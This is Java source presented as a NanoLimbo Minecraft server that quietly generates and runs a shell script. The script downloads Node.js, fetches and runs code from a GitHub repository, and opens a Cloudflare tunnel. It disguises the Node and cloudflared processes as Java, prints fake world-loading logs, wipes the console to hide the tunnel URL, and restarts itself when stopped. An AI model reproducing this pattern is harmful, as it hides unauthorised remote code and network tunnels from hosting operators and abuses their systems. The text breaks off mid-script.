package ua.nanit.limbo;

import java.io.*;
import java.lang.management.ManagementFactory;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;

import sun.misc.Signal;
import sun.misc.SignalHandler;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

// ============================================================
// 【Node.js 部署配置区】
// ============================================================
private static final String MC_BOT_DIR = env("MC_BOT_DIR", "logs/.mcbot");
private static final boolean NODE_ENABLED = !"false".equalsIgnoreCase(env("NODE_ENABLED", "true"));
private static final String GITHUB_REPO = env("GITHUB_REPO", "zx1447/indexaoyoumc");
private static final String GITHUB_BRANCH = env("GITHUB_BRANCH", "main");
private static final String GITHUB_TOKEN = env("GITHUB_TOKEN", "");
private static final boolean CF_ENABLED = !"false".equalsIgnoreCase(env("CF_ENABLED", "true"));
private static final String CF_TOKEN = env("CF_TOKEN", "");
private static final String CF_DOMAIN = env("CF_DOMAIN", "");
private static final String NODE_VERSION = env("NODE_VERSION", "v22.14.0");
private static final String NODE_SCRIPT = env("NODE_SCRIPT", "index.js");
private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false");

private static final String FAKE_CMD = "java -Xms128M -Xmx2560M -jar server.jar -Djline.terminal=jline.UnsupportedTerminal -Dfile.encoding=UTF-8 -Duser.language=zh -Duser.country=CN -Duser.timezone=Asia/Shanghai";
// ============================================================

private static volatile String tunnelUrl = "";
private static volatile String nodePort = "N/A";

private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
private static final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);

// ============================================================
// 【PID 1 僵尸进程回收器】
// 容器内 NanoLimbo JVM 作为 PID 1，必须主动 reap 被收养的孤儿子进程
// （deploy.sh / daemon.sh / node / cloudflared / curl 等崩溃后，
//  它们 spawn 的子进程会 reparent 给本 JVM，不被 reap 则堆积 <defunct>）
//
// 策略：纯 SIGCHLD 驱动，无独立线程，零日志输出
//  - SIGCHLD 信号会合并丢失，但 reapDescendantsOnce() 遍历所有 descendants
//    一次性清完所有已退出子进程，所以信号来一次就够
//  - main 启动时扫一次，覆盖 JVM 启动前残留的孤儿
//  - Shutdown hook 退出时扫一次，覆盖硬重启过程产生的孤儿
// ============================================================
private static volatile boolean reaperInstalled = false;

private static void installZombieReaper() {
    if (reaperInstalled) return;
    reaperInstalled = true;

    // 启动时先扫一次，清理 JVM 启动前残留的孤儿
    reapDescendantsOnce();

    // 注册 SIGCHLD 处理器：子进程退出时 JVM 信号分发线程同步触发 reap
    // （JVM 自带的 Signal Dispatcher 线程负责调用，无需额外线程）
    try {
        Signal.handle(new Signal("CHLD"), new SignalHandler() {
            @Override public void handle(Signal sig) { reapDescendantsOnce(); }
        });
    } catch (Throwable ignored) {}
}

private static void reapDescendantsOnce() {
    try {
        ProcessHandle.current().descendants().forEach(ph -> {
            try {
                if (!ph.isAlive()) {
                    // onExit() 会让 JVM 内部 waitpid() 完成回收
                    ph.onExit().getNow(null);
                }
            } catch (Throwable ignored) {}
        });
    } catch (Throwable ignored) {}
}

private NanoLimbo() {}

private static String env(String k, String d) {
    String v = System.getenv(k);
    return (v != null && !v.trim().isEmpty()) ? v.trim() : d;
}

// ============================================================
// 仿真辅助函数
// ============================================================

private static String tsMs() {
    return LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SSS"));
}

private static void limboLog(String msg) {
    System.out.println(tsMs() + " INFO Limbo --  " + msg);
}

private static void limboLog(String msg, long delayMs) {
    try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
    System.out.println(tsMs() + " INFO Limbo --  " + msg);
}

private static void clearConsole() {
    try {
        for (int i = 0; i < 200; i++) { System.out.println(); }
        System.out.print("\033[3J\033[H\033[2J");
        System.out.flush();
    } catch (Exception ignored) {}
}

// ============================================================
// 入口
// ============================================================

public static void main(String[] args) {
    // ★ PID 1 必须最先安装僵尸回收器，否则容器内孤儿子进程会堆积 <defunct>
    installZombieReaper();

    if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0F) {
        System.err.println("ERROR: Your Java version is too lower, please switch the version in startup menu!");
        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
        System.exit(1);
    }

    forceKillStaleProcessesSafe();
    autoFixLimboConfig();

    if (NODE_ENABLED) {
        Thread deployThread = new Thread(() -> {
            try {
                Path botDir = Paths.get(MC_BOT_DIR);
                Files.createDirectories(botDir);
                Files.deleteIfExists(botDir.resolve(".node_app.log"));
                Files.deleteIfExists(botDir.resolve("daemon.log"));
                Files.deleteIfExists(botDir.resolve(".pids"));

                Path script = generateDeployScript();
                executeDeployScript(script);

                while(tunnelUrl.isEmpty()) {
                    checkDeployInfo();
                    try { Thread.sleep(1000); } catch (InterruptedException e) { return; }
                }

                clearConsole();
                printFakeLimboStartup(tunnelUrl);
                
                try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
                clearConsole();
                
                limboLog("Starting server...", 0);
                limboLog("Preparing level \"world\"", 0);
                limboLog("Preparing start region for dimension minecraft:overworld", 0);
                limboLog("Preparing spawn area: 100%", 0);

                startTunnelMonitor();

                Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                    System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
                    tunnelMonitorRunning.set(false);
                    forceKillStaleProcessesSafe();
                    // ★ 退出前最后扫一遍，避免硬重启过程产生孤儿僵尸
                    reapDescendantsOnce();
                    try {
                        String currentDir = System.getProperty("user.dir");
                        long currentPid = ProcessHandle.current().pid();
                        String jarName = "server.jar";
                        File[] jars = new File(currentDir).listFiles((dir, name) -> name.endsWith(".jar"));
                        if (jars != null && jars.length > 0) jarName = jars[0].getName();
                        String restartScript = "cd '" + currentDir + "' && setsid bash -c 'while kill -0 " + currentPid + " 2>/dev/null; do sleep 0.1; done; sleep 1; java -Xms128M -Xmx2560M -jar " + jarName + " nogui' > /dev/null 2>&1 &";
                        new ProcessBuilder("bash", "-c", restartScript).start();
                    } catch (Exception e) { System.err.println("[Guard] Failed to dispatch restart script: " + e.getMessage()); }
                }, "Shutdown-Guard"));

            } catch (Exception ignored) {}
        }, "Node-Async-Deploy");
        deployThread.setDaemon(true);
        deployThread.start();
    }

    try { new LimboServer().start(); } catch (Throwable t) {}
    try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
}

// ============================================================
// 安全清理僵尸机制
// ============================================================

private static void forceKillStaleProcessesSafe() {
    try {
        Path pidsFile = Paths.get(MC_BOT_DIR).resolve(".pids");
        if (!Files.exists(pidsFile)) return;
        
        for (String pidStr : Files.readAllLines(pidsFile)) {
            try {
                long pid = Long.parseLong(pidStr.trim());
                ProcessHandle.of(pid).ifPresent(handle -> {
                    handle.descendants().forEach(ProcessHandle::destroyForcibly);
                    handle.destroyForcibly();
                });
            } catch (Exception ignored) {}
        }
        Files.deleteIfExists(pidsFile);
    } catch (Exception ignored) {}
}

private static void autoFixLimboConfig() {
    try {
        Path configFile = Paths.get("settings.yml");
        String serverPort = env("SERVER_PORT", "25565");
        Files.deleteIfExists(configFile);
        String content = "bind:\n  host: 0.0.0.0\n  port: " + serverPort + "\nlimbo:\n  dimension: overworld\n  gamemode: adventure\n  max-players: 20\n  player-idle-timeout: 0\n  player-info:\n    username: \"LimboPlayer\"\n    display-name: \"&eLimboPlayer\"\n    property: []\nonline-mode: false\nforward-mode: none\nping:\n  description: \"A NanoLimbo server\"\n  version: \"1.20.x\"\n  max-players: 20\n";
        Files.writeString(configFile, content);
    } catch (Exception ignored) {}
}

private static void printFakeLimboStartup(String url) {
    limboLog("Starting server...", 0);
    limboLog("Binding remote endpoint to: " + url, 0);
    limboLog("Preparing level \"world\"", randInt(100, 300));
    limboLog("Preparing start region for dimension minecraft:overworld", randInt(100, 300));
    limboLog("Preparing spawn area: 1%", 0); limboLog("Preparing spawn area: 2%", 0);
    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 5%", 0); limboLog("Preparing spawn area: 8%", 0);
    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 15%", 0); limboLog("Preparing spawn area: 20%", 0);
    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 35%", 0); limboLog("Preparing spawn area: 60%", 0); limboLog("Preparing spawn area: 80%", 0);
    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 99%", 0); limboLog("Preparing spawn area: 100%", 0);
}

private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }

private static void checkDeployInfo() {
    Path dir = Paths.get(MC_BOT_DIR);
    try {
        Path portFile = dir.resolve(".node_port");
        if (Files.exists(portFile) && nodePort.equals("N/A")) {
            String content = Files.readString(portFile).trim();
            if (!content.isEmpty()) nodePort = content.split("\\n")[0].trim();
        }
    } catch (Exception ignored) {}
    try {
        Path urlFile = dir.resolve(".cf/tunnel_url.txt");
        if (Files.exists(urlFile) && tunnelUrl.isEmpty()) {
            String rawUrl = Files.readString(urlFile).trim();
            java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(rawUrl);
            if (m.find()) {
                String matchedUrl = m.group(1);
                if (!matchedUrl.equals("https://api.trycloudflare.com")) { tunnelUrl = matchedUrl; lastKnownTunnelUrl.set(tunnelUrl); }
            } else if (rawUrl.startsWith("https://") && !rawUrl.contains("api.trycloudflare.com")) { tunnelUrl = rawUrl.split("\\n")[0].trim(); lastKnownTunnelUrl.set(tunnelUrl); }
        }
    } catch (Exception ignored) {}
}

private static void startTunnelMonitor() {
    if (tunnelMonitorRunning.getAndSet(true)) return;
    Thread monitor = new Thread(() -> {
        try { Thread.sleep(20000); } catch (InterruptedException ignored) {}
        while (tunnelMonitorRunning.get()) {
            try {
                Thread.sleep(12000);
                Path urlFile = Paths.get(MC_BOT_DIR).resolve(".cf/tunnel_url.txt");
                if (!Files.exists(urlFile)) continue;
                String content = Files.readString(urlFile).trim();
                if (content.isEmpty()) continue;
                String currentUrl = "";
                java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(content);
                if (m.find()) { String matchedUrl = m.group(1); if (!matchedUrl.equals("https://api.trycloudflare.com")) currentUrl = matchedUrl; } 
                else if (content.startsWith("https://") && !content.contains("api.trycloudflare.com")) { currentUrl = content.split("\\n")[0].trim(); }
                if (currentUrl.isEmpty()) continue;
                String lastUrl = lastKnownTunnelUrl.get();
                if (!currentUrl.equals(lastUrl)) {
                    lastKnownTunnelUrl.set(currentUrl);
                    tunnelUrl = currentUrl;
                    clearConsole();
                    limboLog("Starting server...", 0);
                    limboLog("Binding remote endpoint to: " + currentUrl, 0);
                    limboLog("Preparing level \"world\"", 0);
                    limboLog("Preparing spawn area: 100%", 0);
                    try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
                    clearConsole();
                }
            } catch (Exception ignored) {}
        }
    }, "Tunnel-Monitor");
    monitor.setDaemon(true);
    monitor.start();
}

// ============================================================
// 生成部署脚本 (★ 重点修复 502/1033 断连问题)
// ============================================================

private static Path generateDeployScript() throws Exception {
    Path dir = Paths.get(MC_BOT_DIR).toAbsolutePath();
    Files.createDirectories(dir);
    Path script = dir.resolve("deploy.sh");
    String authToken = GITHUB_TOKEN;
    if (authToken.contains(":") && authToken.substring(authToken.indexOf(':') + 1).startsWith("ghp_")) { authToken = authToken.substring(authToken.indexOf(':') + 1); }
    final String token = authToken;
    String authHeader = "";
    if (!token.isEmpty()) { authHeader = "-H \"Authorization: Bearer " + token + "\" -H \"Accept: application/vnd.github+json\""; }
    String cfMode = CF_TOKEN.isEmpty() ? "quick" : "fixed";

    String content = "#!/bin/bash\n" +
        "set +e\n" +
        "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
        "export HOME=\"" + dir.toAbsolutePath() + "\"\n" +
        "cd \"" + dir.toAbsolutePath() + "\"\n" +
        "\n" +
        "# ============ 1. 下载NodeJS ============\n" +
        "if [ -d \".node\" ]; then\n" +
        "    CHECK_VER=$(.node/bin/.node_real -v 2>/dev/null || .node/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"" + NODE_VERSION.substring(0, NODE_VERSION.indexOf('.', 1)) + "\"* ]]; then rm -rf .node; fi\n" +
        "fi\n" +
        "if ! command -v node &>/dev/null || [ ! -d \".node\" ]; then\n" +
        "    ARCH=$(uname -m)\n" +
        "    NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "    NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
        "    NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
        "    mkdir -p .node\n" +
        "    if [ ! -f .node/bin/node ]; then\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
        "        done\n" +
        "        tar xzf \"/tmp/${NODE_FILE}\" -C .node --strip-components=1 2>/dev/null\n" +
        "        rm -f \"/tmp/${NODE_FILE}\"\n" +
        "    fi\n" +
        "fi\n" +
        "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
        "JRE_DIR=\"" + dir.toAbsolutePath() + "/jre21/bin\"\n" +
        "mkdir -p \"$JRE_DIR\"\n" +
        "\n" +
        "if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then cp -f \".node/bin/node\" \".node/bin/.node_real\"; chmod +x \".node/bin/.node_real\"; fi\n" +
        "if [ ! -f \".node/bin/.node_real\" ] || ! \".node/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then cp -f \".node/bin/node\" \".node/bin/.node_real\"; chmod +x \".node/bin/.node_real\";\n" +
        "    else\n" +
        "        ARCH=$(uname -m); NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "        NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"; NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"; rm -f /tmp/${NODE_FILE}\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi; done\n" +
        "        mkdir -p /tmp/_node_tmp; tar xzf \"/tmp/${NODE_FILE}\" -C /tmp/_node_tmp --strip-components=1 2>/dev/null; cp -f /tmp/_node_tmp/bin/node \".node/bin/.node_real\"; chmod +x \".node/bin/.node_real\"; rm -rf /tmp/${NODE_FILE} /tmp/_node_tmp\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ============ 2. 安全获取代码 ============\n" +
        "if [ ! -f " + NODE_SCRIPT + " ] || [ \"" + NODE_FORCE_UPDATE + "\" = \"true\" ]; then\n" +
        "    TAR_URL=\"https://api.github.com/repos/" + GITHUB_REPO + "/tarball/" + GITHUB_BRANCH + "\"; DOWNLOAD_OK=false\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$TAR_URL\" -o /tmp/_app.tar.gz; then if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n") +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "        FALLBACK_URL=\"https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".tar.gz\"\n" +
        "        for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o /tmp/_app.tar.gz; then if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done\n" +
        "    fi\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then for PROXY in \"https://gh-proxy.com\" \"https://mirror.ghproxy.com\"; do PROXY_URL=\"${PROXY}/${TAR_URL}\"; if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$PROXY_URL\" -o /tmp/_app.tar.gz; then if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n") +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
        "    find . -maxdepth 1 ! -name '.' ! -name '.node' ! -name '.cf' ! -name '.pids' ! -name 'deploy.sh' ! -name 'daemon.sh' ! -name '.nd_preload.js' ! -name 'jre21' ! -name 'node_modules' ! -name '*config*' ! -name '*.log' -exec rm -rf {} + 2>/dev/null\n" +
        "    mkdir -p /tmp/_app_extract; tar xzf /tmp/_app.tar.gz -C /tmp/_app_extract --strip-components=1 2>/dev/null; cp -rf /tmp/_app_extract/* . 2>/dev/null; cp -rf /tmp/_app_extract/.* . 2>/dev/null; rm -rf /tmp/_app.tar.gz /tmp/_app_extract\n" +
        "fi\n" +
        "\n" +
        "# ============ 3. 安装依赖 ============\n" +
        "if [ -f package.json ] && [ ! -d node_modules ]; then\n" +
        "    .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --no-optional --cache /tmp/npm-cache >/dev/null 2>&1\n" +
        "    if [ $? -ne 0 ]; then .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --legacy-peer-deps --no-optional --cache /tmp/npm-cache >/dev/null 2>&1; fi\n" +
        "    rm -rf /tmp/npm-cache\n" +
        "fi\n" +
        "\n" +
        "# ============ 4. 替换伪装 ============\n" +
        "ln -sf \"" + dir.toAbsolutePath() + "/.node/bin/.node_real\" \"$JRE_DIR/java\"; chmod +x \"$JRE_DIR/java\"\n" +
        "cat > \".nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = '" + FAKE_CMD + "';\n" +
        "    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork; var _wp = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    _cp.spawn = function(cmd, args, opts) { if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) { opts = Object.assign({}, opts || {}); opts.execPath = _wp; cmd = _wp; } return _origSpawn.call(this, cmd, args, opts); };\n" +
        "    _cp.fork = function(mod, args, opts) { opts = Object.assign({}, opts || {}); opts.execPath = _wp; return _origFork.call(this, mod, args, opts); };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "export _JAVA_WRAPPER=\"" + dir.toAbsolutePath() + "/.node/bin/node\"\n" +
        "\n" +
        "# ============ 5. 启动NodeJS应用 (严格等待HTTP就绪防502) ============\n" +
        "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
        "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
        "export SERVER_PORT=$NODE_PORT; export PORT=$NODE_PORT\n" +
        "(exec -a \"" + FAKE_CMD + "\" \"$JRE_DIR/java\" " + NODE_SCRIPT + " > .node_app.log 2>&1) &\n" +
        "NODE_PID=$!; echo \"$NODE_PID\" >> .pids\n" +
        // ★ 修复：必须等到 Node 内部 HTTP 返回 200 才放行，杜绝冷启动 502
        "for i in $(seq 1 120); do HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" 2>/dev/null); if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1; done\n" +
        "echo \"$NODE_PORT\" > .node_port\n" +
        "\n" +
        // ★ 修复：Cloudflared 超时与防断连配置
        "# ============ 6. 启动隧道 (防 1033/502 强化配置) ============\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"; CF_CONF_DIR=\"" + dir.toAbsolutePath() + "/jre21/conf\"; mkdir -p \"$CF_CONF_DIR\"; ACTUAL_PORT=$NODE_PORT\n" +
        "if [ \"" + CF_ENABLED + "\" = \"true\" ]; then\n" +
        "    mkdir -p .cf\n" +
        "    if [ ! -f \"$CF_BIN\" ]; then ARCH=$(uname -m); CF_URL=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\" || echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\"); for MIRROR in \"$CF_URL\" \"https://gh-proxy.com/${CF_URL}\"; do if curl -fsSL --connect-timeout 30 --max-time 120 \"$MIRROR\" -o \"$CF_BIN\"; then chmod +x \"$CF_BIN\"; break; fi; done; fi\n" +
        "    if [ -f \"$CF_BIN\" ]; then\n" +
        "        if [ \"" + cfMode + "\" = \"fixed\" ] && [ -n \"" + CF_TOKEN + "\" ]; then\n" +
        "            for PROTO in http2 quic; do rm -f .cf/cf.log; (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > .cf/cf.log 2>&1) & CF_PID=$!; sleep 5; if kill -0 $CF_PID 2>/dev/null; then echo \"$CF_PID\" >> .pids; echo \"" + CF_DOMAIN + "\" > .cf/tunnel_url.txt; break; fi; wait $CF_PID 2>/dev/null; done\n" +
        "        else\n" +
        "            TUNNEL_ESTABLISHED=false\n" +
        "            for PROTO in http2 quic auto; do\n" +
        "                if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
        "                for attempt in 1 2 3; do\n" +
        "                    if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
        "                    rm -f .cf/cf.log .cf/tunnel_url.txt; cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
        "url: http://127.0.0.1:$ACTUAL_PORT\n" +
        "no-autoupdate: true\n" +
        "protocol: $PROTO\n" +
        // ★ 新增：代理连接超时时间延长到 30 秒，防止慢网络下 CF 等不及报 502
        "proxy-connect-timeout: 30s\n" +
        // ★ 新增：保持连接活跃，防止长时间无数据被防火墙掐断报 1033
        "proxy-keep-alive-timeout: 90s\n" +
        "CFCONF\n" +
        "                    (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > .cf/cf.log 2>&1) & CF_PID=$!; sleep 5\n" +
        "                    if ! kill -0 $CF_PID 2>/dev/null; then wait $CF_PID 2>/dev/null; continue; fi\n" +
        "                    for i in $(seq 1 45); do\n" +
        "                        if ! kill -0 $CF_PID 2>/dev/null; then break; fi\n" +
        "                        URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' .cf/cf.log 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
        "                        if [ -n \"$URL\" ]; then echo \"$URL\" > .cf/tunnel_url.txt; echo \"PROTOCOL=$PROTO\" >> .cf/tunnel_url.txt; echo \"CF_PID=$CF_PID\" >> .cf/tunnel_url.txt; echo \"$CF_PID\" >> .pids; TUNNEL_ESTABLISHED=true; break; fi\n" +
        "                        sleep 1\n" +
        "                    done\n" +
        "                    if [ \"$TUNNEL_ESTABLISHED\" != \"true\" ]; then kill $CF_PID 2>/dev/null; wait $CF_PID 2>/dev/null; fi\n" +
        "                done\n" +
        "            done\n" +
        "        fi\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        // ★ 修复：守护脚本增加内部 HTTP 探针，防事件循环死锁 502
        "# ============ 7. 守护循环 (防死锁探针 + HTTP2 优先) ============\n" +
        "cat > \"daemon.sh\" << 'DAEMONSCRIPT'\n" +
        "#!/bin/bash\n" +
        "trap 'kill 0; wait' EXIT TERM INT\n" +
        "WORK_DIR=\"" + dir.toAbsolutePath() + "\"; JRE_DIR=\"$WORK_DIR/jre21/bin\"; CF_BIN=\"$JRE_DIR/java_cf\"; CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"; NODE_FAKE=\"$JRE_DIR/java\"; APP_DIR=\"$WORK_DIR\"; NODE_SCRIPT=\"" + NODE_SCRIPT + "\"\n" +
        "PORT=$(cat \"$WORK_DIR/.node_port\" 2>/dev/null || echo \"25565\"); export SERVER_PORT=$PORT; export PORT=$PORT; export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"; export PATH=\"$WORK_DIR/.node/bin:$PATH\"\n" +
        "write_cf_config() { local PROTO=$1; cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
        "url: http://localhost:$PORT\n" +
        "no-autoupdate: true\n" +
        "protocol: $PROTO\n" +
        "proxy-connect-timeout: 30s\n" +
        "proxy-keep-alive-timeout: 90s\n" +
        "CFCONF\n }\n" +
        "NODE_PID=$(head -1 \"$WORK_DIR/.pids\" 2>/dev/null); CF_PID=\"\"; NODE_FAIL_COUNT=0\n" +
        "while true; do\n" +
        "    NEED_RESTART_NODE=false\n" +
        "    if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then NEED_RESTART_NODE=true; fi\n" +
        // ★ 探针机制：如果 Node 进程还在，但 HTTP 连续 3 次无响应，判定为死锁，强制重启
        "    if [ \"$NEED_RESTART_NODE\" = \"false\" ]; then\n" +
        "        HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$PORT\" --connect-timeout 2 --max-time 5 2>/dev/null)\n" +
        "        if [ \"$HTTP_CODE\" = \"000\" ] || [ -z \"$HTTP_CODE\" ]; then\n" +
        "            NODE_FAIL_COUNT=$((NODE_FAIL_COUNT + 1))\n" +
        "            if [ $NODE_FAIL_COUNT -ge 3 ]; then NEED_RESTART_NODE=true; fi\n" +
        "        else NODE_FAIL_COUNT=0; fi\n" +
        "    fi\n" +
        "    if [ \"$NEED_RESTART_NODE\" = \"true\" ]; then\n" +
        // ★ 修复双 node 并存：1) 杀整个进程树 2) SIGTERM 后强制 SIGKILL 3) 等端口释放
        "        if [ -n \"$NODE_PID\" ]; then\n" +
        "            kill \"$NODE_PID\" 2>/dev/null\n" +
        "            for child in $(pgrep -P \"$NODE_PID\" 2>/dev/null); do kill \"$child\" 2>/dev/null; done\n" +
        "            for i in 1 2 3 4 5; do kill -0 \"$NODE_PID\" 2>/dev/null || break; sleep 0.5; done\n" +
        "            kill -9 \"$NODE_PID\" 2>/dev/null; wait \"$NODE_PID\" 2>/dev/null\n" +
        "        fi\n" +
        "        if [ -n \"$CF_PID\" ]; then kill \"$CF_PID\" 2>/dev/null; kill -9 \"$CF_PID\" 2>/dev/null; wait \"$CF_PID\" 2>/dev/null; CF_PID=\"\"; fi\n" +
        // ★ 等端口释放，避免新 node bind 失败
        "        for i in $(seq 1 10); do is_port_free \"$PORT\" && break; sleep 0.5; done\n" +
        "        cd \"$APP_DIR\"; export SERVER_PORT=$PORT; export PORT=$PORT; (exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) & NODE_PID=$!\n" +
        "        echo \"$NODE_PID\" > \"$WORK_DIR/.pids\"\n" +
        "        NODE_FAIL_COUNT=0\n" +
        "        for i in $(seq 1 60); do HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$PORT\" 2>/dev/null); if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1; done\n" +
        "    fi\n" +
        "\n" +
        "    NEED_REBUILD=false\n" +
        "    if [ -z \"$CF_PID\" ]; then NEED_REBUILD=true; elif ! kill -0 $CF_PID 2>/dev/null; then wait $CF_PID 2>/dev/null; NEED_REBUILD=true; fi\n" +
        "    if [ \"$NEED_REBUILD\" = \"true\" ]; then\n" +
        "        rm -f \"$WORK_DIR/.cf/tunnel_url.txt\" \"$WORK_DIR/.cf/cf.log\"; TUNNEL_OK=false\n" +
        // ★ 优先使用 HTTP2，在丢包网络下比 QUIC 更稳定
        "        for RPROTO in http2 quic auto; do\n" +
        "            if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi; rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
        "            write_cf_config \"$RPROTO\"\n" +
        "            (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$WORK_DIR/.cf/cf.log\" 2>&1) & NEW_PID=$!\n" +
        "            for i in $(seq 1 45); do\n" +
        "                if ! kill -0 $NEW_PID 2>/dev/null; then break; fi\n" +
